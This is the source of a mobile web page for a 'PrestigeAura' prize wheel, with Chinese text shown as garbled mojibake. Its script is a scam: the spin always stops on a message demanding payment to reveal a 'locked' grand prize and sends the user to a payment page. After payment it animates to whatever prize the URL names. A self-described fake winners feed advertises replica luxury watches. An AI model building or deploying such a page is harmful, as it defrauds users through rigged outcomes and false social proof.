<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>üé° PrestigeAura Spin</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg,#0f2027,#203a43,#2c5364);
      color: white; margin: 0; padding: 0;
      display: flex; flex-direction: column; align-items: center;
    }
    h1 { margin: 15px 0; font-size: 22px; }
    .wheel-container { position: relative; width: 90vw; max-width: 320px; }
    #wheelCanvas { width: 100%; height: auto; border-radius: 50%; z-index:1; position:relative; }
    #pointer {
      position: absolute;
      top: -10px;
      left: 50%;
      transform: translateX(-50%);
      width: 0; height: 0;
      border-left: 20px solid transparent;
      border-right: 20px solid transparent;
      border-top: 40px solid gold; /* ÂÄí‰∏âËßí */
      z-index: 9999;
    }
    #spinBtn {
      margin: 15px 0;
      padding: 15px 30px;
      font-size: 18px;
      background: linear-gradient(45deg,#f7971e,#ffd200);
      border: none; border-radius: 50px;
      font-weight: bold; color: #000;
      cursor: pointer;
    }
    .btn-home {
      margin: 5px;
      padding: 10px 20px;
      background: linear-gradient(45deg,#36d1dc,#5b86e5);
      border: none; border-radius: 30px;
      color: white; text-decoration: none;
    }
    .popup {
      display: none; position: fixed;
      top: 30%; left: 50%;
      transform: translate(-50%, -30%);
      background: white; color: black;
      padding: 20px; border-radius: 12px;
      width: 80%; max-width: 400px;
      z-index: 1000; text-align: center;
      box-shadow: 0 0 15px rgba(0,0,0,0.3);
    }
    .popup button {
      margin: 8px; padding: 10px 20px;
      border: none; border-radius: 8px; cursor: pointer;
    }
    #closeBtn {
      position: absolute;
      top: 10px; right: 10px;
      border: none; background: none;
      font-size: 20px; cursor: pointer;
    }
    .leaderboard {
      margin: 20px auto; width: 90%;
      background: rgba(255,255,255,0.1);
      padding: 10px; border-radius: 10px;
    }
    .leaderboard ul { list-style: none; padding: 0; margin: 0; }
    .leaderboard li {
      margin: 5px 0; padding: 5px;
      background: rgba(255,255,255,0.2); border-radius: 5px;
    }
  </style>
</head>
<body>
  <h1 data-i18n="spin_title">üé° PrestigeAura Lottery</h1>

  <div class="wheel-container">
    <canvas id="wheelCanvas" width="320" height="320"></canvas>
    <div id="pointer"></div>
  </div>

  <button id="spinBtn" data-i18n="spin_now">SPIN</button>
  <a href="index.html" class="btn-home" data-i18n="back_home">üè† Back to Home</a>

  <div id="popup" class="popup">
    <button id="closeBtn">√ó</button>
    <h2 id="popupTitle" data-i18n="result_title">üéØ Result</h2>
    <p id="popupText">Processing...</p>
    <button id="continueBtn" style="background:green;color:white;" data-i18n="continue_play">üîÑ Continue</button>
  </div>

  <div class="leaderboard">
    <h3 data-i18n="live_feed">üî• Live Winners Feed</h3>
    <ul id="leaderboardList"></ul>
  </div>

  <audio id="bgMusic" src="assets/bg-music.mp3" loop></audio>
  <audio id="tickSound" src="assets/tick.mp3"></audio>
  <audio id="winSound" src="assets/win.mp3"></audio>

  <script>
    const canvas = document.getElementById("wheelCanvas");
    const ctx = canvas.getContext("2d");

    const popup = document.getElementById("popup");
    const popupText = document.getElementById("popupText");
    const continueBtn = document.getElementById("continueBtn");
    const closeBtn = document.getElementById("closeBtn");

    const params = new URLSearchParams(window.location.search);
    const mode = params.get("mode") || "unlimited";
    let round = parseInt(params.get("round") || "1");
    const prizeParam = params.get("prize");

    const prizes = ["Watch","Gold","60% Coupon","50% Coupon","Thanks"];

    function drawWheel(prizes) {
      const slices = prizes.length;
      const angleStep = (2 * Math.PI) / slices;
      for (let i=0; i<slices; i++) {
        const startAngle = i * angleStep;
        const endAngle = startAngle + angleStep;
        ctx.beginPath();
        ctx.moveTo(160,160);
        ctx.arc(160,160,160,startAngle,endAngle);
        ctx.fillStyle = i % 2 === 0 ? "#f7971e" : "#36d1dc";
        ctx.fill();
        ctx.stroke();
        ctx.save();
        ctx.translate(160,160);
        ctx.rotate(startAngle + angleStep/2);
        ctx.fillStyle = "#fff";
        ctx.font = "bold 14px Arial";
        ctx.textAlign = "right";
        ctx.fillText(prizes[i], 140, 10);
        ctx.restore();
      }
    }
    drawWheel(prizes);

    // ÁÇπÂáªÊäΩÂ•ñ
    document.getElementById("spinBtn").onclick = () => {
      spinUntilPayment();
    };

    function spinUntilPayment() {
      let angle = 0, spinTime = 0, spinTimeTotal = 3000;
      function rotate() {
        spinTime += 30;
        if (spinTime >= spinTimeTotal) {
          popup.style.display = "block";
          popupText.innerText = "üéØ Â§ßÂ•ñÂ∑≤ÈîÅÂÆöÔºÅËØ∑ÂÆåÊàêÊîØ‰ªòÊè≠ÊôìÁªìÊûú";
          continueBtn.onclick = () => {
            location.href = `pay.html?mode=${mode}&round=${round}&prize=Watch`;
          };
          return;
        }
        angle += 0.5;
        ctx.clearRect(0,0,320,320);
        ctx.save();
        ctx.translate(160,160);
        ctx.rotate(angle);
        ctx.translate(-160,-160);
        drawWheel(prizes);
        ctx.restore();
        requestAnimationFrame(rotate);
      }
      rotate();
    }

    // ÊîØ‰ªòËøîÂõûÂêéÁªßÁª≠ÊóãËΩ¨Âà∞Â•ñÂìÅ
    if (prizeParam) {
      popup.style.display = "block";
      popupText.innerText = `üéâ ÊÅ≠ÂñúÊäΩ‰∏≠Â§ßÂ•ñÔºö${prizeParam}ÔºÅ`;
      continueBtn.onclick = () => {
        popup.style.display = "none";
        slowSpinToPrize(prizeParam);
      };
    }

    function slowSpinToPrize(targetPrize) {
      let angle = 0, spinTime = 0, spinTimeTotal = 5000;
      const prizeIndex = prizes.indexOf(targetPrize);
      const sliceAngle = (2 * Math.PI) / prizes.length;
      const targetAngle = (prizeIndex + 0.5) * sliceAngle;

      function rotate() {
        spinTime += 30;
        if (spinTime >= spinTimeTotal) {
          ctx.clearRect(0,0,320,320);
          ctx.save();
          ctx.translate(160,160);
          ctx.rotate(targetAngle);
          ctx.translate(-160,-160);
          drawWheel(prizes);
          ctx.restore();
          popup.style.display = "block";
          popupText.innerText = `üéâ ÊÅ≠Âñú‰Ω†ÊúÄÁªàËé∑ÂæóÔºö${targetPrize}ÔºÅ`;
          return;
        }
        angle += (spinTimeTotal - spinTime) / spinTimeTotal * 0.2;
        ctx.clearRect(0,0,320,320);
        ctx.save();
        ctx.translate(160,160);
        ctx.rotate(angle);
        ctx.translate(-160,-160);
        drawWheel(prizes);
        ctx.restore();
        requestAnimationFrame(rotate);
      }
      rotate();
    }

    closeBtn.onclick = () => {
      popup.style.display = "none";
    };

    // ÂÅáÊéíË°åÊ¶ú
    const feed = [
      "@alex won a Replica Rolex!",
      "@maria got a Gold Necklace!",
      "@chen won a Replica AP!",
      "@li got a Gold Bracelet!"
    ];
    const list = document.getElementById("leaderboardList");
    function updateFeed() {
      const msg = feed[Math.floor(Math.random() * feed.length)];
      const li = document.createElement("li");
      li.innerText = msg;
      if (list.children.length > 5) list.removeChild(list.firstChild);
      list.appendChild(li);
    }
    setInterval(updateFeed, 4000);
    updateFeed();
  </script>
</body>
</html>
